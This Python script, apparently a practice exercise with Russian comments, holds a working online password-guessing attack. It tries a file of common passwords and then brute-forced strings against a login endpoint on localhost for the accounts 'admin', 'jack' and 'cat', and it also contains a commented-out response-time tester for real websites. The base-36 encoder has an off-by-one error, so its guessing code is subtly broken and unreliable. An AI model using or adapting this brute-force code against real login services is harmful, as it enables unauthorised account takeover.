# use Python 3.8
import random
import json
from typing import Text, Iterable
import time

import requests

N = 10

URLS = ['https://www.avito.ru/',
        'https://www.speedtest.net/',
        'https://djbook.ru/',
        'http://styxcosmetic.ru/',
        'https://www.simplifiedpython.net/',
        'https://ling47.ru/',
        ]


def test_url(what_url: Text, count: int = 10, sleep_time: int = 1) -> float:
    """
    выполнит http get запрос по  адресу если код не 200 сгенирит ошибку
    если все хорошо - подсчитает время выполнения запросов
    :param what_url: url запроса
    :param count: кол-во повторов
    :param sleep_time: задержка между повторами
    :return:
    """
    begin_time = time.monotonic()
    print(f'\nbegin test {what_url} :')
    for i in range(count):
        response = requests.get(url=what_url)
        print('.', end='')
        if response.status_code != 200:
            raise ConnectionError(f'{what_url} -> Bad response code {response.status_code} in {i} iteration ')

        time.sleep(sleep_time)

    return time.monotonic() - begin_time


def get_alphabet():
    let = ''.join([chr(i) for i in range(97, 97 + 26)])
    numbers = '0123456789'
    alphabet = numbers + let
    return alphabet


def encode(number, alphabet):
    result = ''
    base = len(alphabet)
    spam = number
    while spam > 0:
        rest = spam % base
        spam = spam // base
        result = alphabet[rest - 1] + result
    return result


def get_brootforce():
    alphabet = get_alphabet()

    pass_len = 3
    counter = 0
    password = ''
    while True:
        counter += 1
        password = encode(counter, alphabet)
        yield password


def get_good_pass(password_length: int = 8) -> Text:
    """Генирация хорошего пароля"""
    let = ''.join([chr(i) for i in range(97, 97 + 26)])

    let_up = let.upper()
    symbols = ''.join([chr(i) for i in range(33, 64)])
    alpha = let + let_up + symbols
    new_pass = ''

    for _ in range(password_length):
        new_pass += random.choice(alpha)
    return new_pass


def get_bad_passwords() -> Iterable:
    """Считываем count плохих паролей и отдаем их гениратор"""
    reading_lines = []
    with open('./test.txt', 'rt', encoding='utf-8') as file:
        reading_lines = file.readlines()

    def wrapper():
        for current in reading_lines:
            yield current.strip()

    return wrapper()


def is_valid(name: Text, password: Text, url: Text) -> bool:
    data = {
        'login': name,
        'password': password,
    }
    response = requests.post(url=url, json=data)
    if response.status_code == 200:
        return True
    else:
        return False


def hack_password(name, url):
    bad_gen = get_bad_passwords()
    bust_gen = get_brootforce()
    password = '1'
    while password:
        password = next(bad_gen)
        if not password:
            # В файле обшеизвестных не нашел
            break

        if is_valid(name,password,url):
            return password
    while True:
        password = next(bust_gen)
        if is_valid(name,password,url):
            return password



def main():
    user_names = ['admin', 'jack', 'cat']
    url = 'http://127.0.0.1:5000/auth'
    for name in user_names:
        user_password = hack_password(name, url)
        print(f'for {name} I found {user_password} password')


if __name__ == '__main__':
    main()
    # gen_bf = get_brootforce()
    # for current in gen_bf:
    #     print(current)
    #     if len(current) >3:
    #         break

    # alph = get_alphabet()
    # res = encode(40,alph)
    # for i in range(100):
    #     print(encode(i,alph))
    # print(res)
    # print('beg')
    # bad_passwords = get_bad_passwords(count=20)
    # for current_password in bad_passwords:
    #     print(current_password)
    #
    # for url in URLS:
    #     try:
    #         time_period = test_url(what_url=url, count=100, sleep_time=5)
    #         print(f'\nTest end with {time_period} sec')
    #     except ConnectionError as ex:
    #         print(ex.args)
